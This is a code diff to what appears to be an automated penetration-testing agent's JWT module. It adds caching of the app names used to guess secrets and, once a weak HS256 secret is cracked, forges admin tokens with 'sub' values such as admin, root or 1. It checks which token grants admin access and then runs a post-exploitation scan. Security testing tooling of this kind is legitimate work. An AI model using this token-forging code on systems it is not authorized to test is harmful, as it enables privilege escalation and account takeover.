@@ -732,29 +732,48 @@ class JWTAgent(BaseAgent, TechContextMixin):
     async def _extract_app_name_from_root(self, url: str) -> List[str]:
         """Extract potential app names for JWT secret generation.
 
-        Strategy (ordered by reliability):
-        1. Read cached recon data from disk (always available, no HTTP needed)
-        2. Fetch root URL with retry (may fail under load)
+        Strategy order (short-circuit on cache hit):
+        0. Check pre-fetched cache (self._cached_app_names from Phase B prefetch)
+        1. Check persisted app_names.json from report_dir
+        2. Read recon data from disk (fast, no HTTP needed)
+        3. Fetch root URL with retries + backoff (complements cache)
+        4. If both empty, retry cache after delay (recon data may still be writing)
+        5. Persist results to app_names.json for other agents
         """
-        import re
         from urllib.parse import urlparse
         import aiohttp
+        from pathlib import Path
 
+        # --- Strategy 0: Return pre-fetched names if available ---
+        if hasattr(self, '_cached_app_names') and self._cached_app_names:
+            return self._cached_app_names
+
+        report_dir = getattr(self, 'report_dir', None)
         names = []
 
-        # --- Strategy 1: Extract from cached recon data (report_dir) ---
-        report_dir = getattr(self, 'report_dir', None)
+        # --- Strategy 1: Check persisted app_names.json ---
+        if report_dir:
+            cache_file = Path(report_dir) / "recon" / "app_names.json"
+            if cache_file.exists():
+                try:
+                    cached = json.loads(cache_file.read_text(encoding="utf-8"))
+                    if isinstance(cached, list) and cached:
+                        logger.info(f"[{self.name}] Loaded {len(cached)} app names from cache: {cached}")
+                        self._cached_app_names = cached
+                        return cached
+                except Exception:
+                    pass
+
+        # --- Strategy 2: Extract from recon data on disk ---
         if report_dir:
             names.extend(self._extract_names_from_recon_cache(report_dir))
 
-        # --- Strategy 2: Fetch root page with retry ---
+        # --- Strategy 3: Fetch root page with retries + backoff ---
         parsed = urlparse(url)
         root_url = f"{parsed.scheme}://{parsed.netloc}/"
-        timeouts = [5, 10]  # Retry with increasing timeout
+        timeouts = [8, 15, 25]
 
         for attempt, timeout_sec in enumerate(timeouts):
-            if names:
-                break  # Already have names from cache, skip HTTP
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(root_url, timeout=aiohttp.ClientTimeout(total=timeout_sec), ssl=False) as resp:
@@ -762,15 +781,37 @@ class JWTAgent(BaseAgent, TechContextMixin):
                 names.extend(self._extract_names_from_html(text))
                 break
             except Exception as e:
-                logger.debug(f"[{self.name}] Root page fetch attempt {attempt + 1} failed: {e}")
+                logger.warning(f"[{self.name}] Root page fetch attempt {attempt + 1}/{len(timeouts)} failed (timeout={timeout_sec}s): {e}")
+                if attempt < len(timeouts) - 1:
+                    backoff = (attempt + 1) * 3
+                    logger.info(f"[{self.name}] Retrying in {backoff}s...")
+                    await asyncio.sleep(backoff)
+
+        # --- Strategy 4: Retry cache if nothing found yet ---
+        if not names and report_dir:
+            logger.info(f"[{self.name}] No names yet, retrying recon cache after 5s delay...")
+            await asyncio.sleep(5)
+            names.extend(self._extract_names_from_recon_cache(report_dir))
 
         # Deduplicate
         names = list(dict.fromkeys(names))
+
+        # --- Strategy 5: Persist to app_names.json for other agents ---
+        if names and report_dir:
+            try:
+                cache_file = Path(report_dir) / "recon" / "app_names.json"
+                cache_file.parent.mkdir(parents=True, exist_ok=True)
+                cache_file.write_text(json.dumps(names, indent=2), encoding="utf-8")
+                logger.debug(f"[{self.name}] Persisted {len(names)} app names to {cache_file}")
+            except Exception as e:
+                logger.debug(f"[{self.name}] Could not persist app names: {e}")
+
         if names:
             logger.info(f"[{self.name}] Extracted app names for secret generation: {names}")
         else:
             logger.warning(f"[{self.name}] No app names extracted — dynamic JWT secrets will be limited")
 
+        self._cached_app_names = names
         return names
 
     def _extract_names_from_html(self, text: str) -> List[str]:
@@ -1036,20 +1077,32 @@ class JWTAgent(BaseAgent, TechContextMixin):
         """Exploit cracked JWT secret by forging admin token."""
         self.think(f"🔥 CRITICAL: Found weak JWT secret: '{secret}'")
 
-        forged_token = self._forge_admin_token(decoded, parts, secret)
+        # Generate multiple token variations with different sub/username claims
+        # Most apps check the DB user's role via the 'sub' claim, not JWT role claims
+        token_variations = self._forge_admin_token_variations(decoded, parts, secret)
 
-        # Store forged token for cross-agent auth chaining
+        # Try each variation — store the first one that grants admin access
+        working_token = None
+        for variation_token, variation_desc in token_variations:
+            if await self._verify_token_works(variation_token, url, location):
+                working_token = variation_token
+                logger.info(f"[{self.name}] Admin token verified: {variation_desc}")
+                self.think(f"SUCCESS: Admin privilege escalation confirmed ({variation_desc})")
+                break
+
+        # Store the best token (working or first variation as fallback)
+        forged_token = working_token or token_variations[0][0]
         if self._scan_context:
             from bugtrace.services.scan_context import store_auth_token
             store_auth_token(self._scan_context, "jwt_forged_admin", forged_token)
-            logger.info(f"[{self.name}] Stored forged admin token for cross-agent auth chaining")
+            logger.info(f"[{self.name}] Stored forged admin token for cross-agent auth chaining (verified={working_token is not None})")
 
         self.findings.append({
             "type": "Weak JWT Secret",
             "url": url,
             "parameter": "header",
             "payload": secret,
-            "evidence": f"Secret cracked: {secret}. Forged admin token created.",
+            "evidence": f"Secret cracked: {secret}. Forged admin token created (verified={working_token is not None}).",
             "severity": normalize_severity("CRITICAL").value,
             "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
             "cve_id": "N/A",  # Vulnerability class, not specific CVE
@@ -1057,33 +1110,71 @@ class JWTAgent(BaseAgent, TechContextMixin):
             "validated": True,
             "status": "VALIDATED_CONFIRMED",
             "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
-            "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)",
+            "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'sub': 'admin', 'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)",
             "http_request": f"GET {url} with forged token",
             "http_response": "200 OK with admin privileges"
         })
 
-        if await self._verify_token_works(forged_token, url, location):
-            self.think("SUCCESS: Admin privilege escalation confirmed!")
-            # FIX (2026-02-16): Post-exploitation — probe authenticated endpoints
-            # for common vulns (RCE, SSTI) that are only reachable with admin JWT.
+        if working_token:
             await self._post_exploit_authenticated_scan(secret, decoded, forged_token, url)
 
-    def _forge_admin_token(self, decoded: Dict, parts: List[str], secret: str) -> str:
-        """Forge admin JWT token with cracked secret."""
-        new_payload = decoded['payload'].copy()
-        new_payload['admin'] = True
-        new_payload['role'] = 'admin'
-        if 'user' in new_payload:
-            new_payload['user'] = 'admin'
+    def _forge_admin_token_variations(self, decoded: Dict, parts: List[str], secret: str) -> List[tuple]:
+        """
+        Forge multiple admin JWT token variations with different sub/username claims.
 
-        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
+        Most apps use 'sub' to look up the user in the DB, then check the DB role.
+        Simply adding role='admin' to the JWT doesn't work if the DB user isn't admin.
+        We try common admin usernames as 'sub' to match real admin accounts.
+
+        Returns list of (token_string, description) tuples.
+        """
+        variations = []
+        original_sub = decoded['payload'].get('sub', '')
+        admin_names = ['admin', 'administrator', 'root']
+
+        # Variations 1-3: common admin usernames as sub (most apps check DB role via sub)
+        # Put these FIRST so the fallback token (variations[0]) has the best chance
+        for admin_name in admin_names:
+            if admin_name == original_sub:
+                continue
+            v = decoded['payload'].copy()
+            v['admin'] = True
+            v['role'] = 'admin'
+            v['sub'] = admin_name
+            if 'user' in v:
+                v['user'] = admin_name
+            if 'username' in v:
+                v['username'] = admin_name
+            variations.append((self._sign_forged_payload(v, parts[0], secret), f"sub='{admin_name}'"))
+
+        # Variation 4: original sub + admin claims (works if app trusts JWT claims)
+        v1 = decoded['payload'].copy()
+        v1['admin'] = True
+        v1['role'] = 'admin'
+        if 'user' in v1:
+            v1['user'] = 'admin'
+        variations.append((self._sign_forged_payload(v1, parts[0], secret), f"original sub='{original_sub}' + admin claims"))
+
+        # Variation 5: numeric sub=1 (first user is often admin)
+        if original_sub not in ('1', 1):
+            v = decoded['payload'].copy()
+            v['admin'] = True
+            v['role'] = 'admin'
+            v['sub'] = 1
+            variations.append((self._sign_forged_payload(v, parts[0], secret), "sub=1 (numeric admin)"))
+
+        return variations
+
+    def _sign_forged_payload(self, payload: Dict, header_b64: str, secret: str) -> str:
+        """Sign a forged JWT payload with the cracked secret."""
+        p_json = json.dumps(payload, separators=(',', ':')).encode()
         p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
 
-        new_signing_input = f"{parts[0]}.{p_b64}".encode()
+        new_signing_input = f"{header_b64}.{p_b64}".encode()
         new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
         new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')
 
-        return f"{parts[0]}.{p_b64}.{new_sig_b64}"
+        return f"{header_b64}.{p_b64}.{new_sig_b64}"
 
     # ========================================
     # Post-Exploitation: Authenticated Scanning
@@ -1711,6 +1802,18 @@ Your job is to identify and remove duplicate JWT vulnerabilities while preservin
         """
         logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
         logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")
+
+        # Pre-fetch app names NOW, before exploitation competes for HTTP connections.
+        # Under scan load, the root page fetch can timeout if done later alongside
+        # other specialists hammering the target.
+        first_url = None
+        for f in self._dry_findings:
+            if isinstance(f, dict) and f.get("url"):
+                first_url = f["url"]
+                break
+        if first_url:
+            logger.info(f"[{self.name}] Pre-fetching app names for secret generation...")
+            self._cached_app_names = await self._extract_app_name_from_root(first_url)
 
         validated_findings = []
 
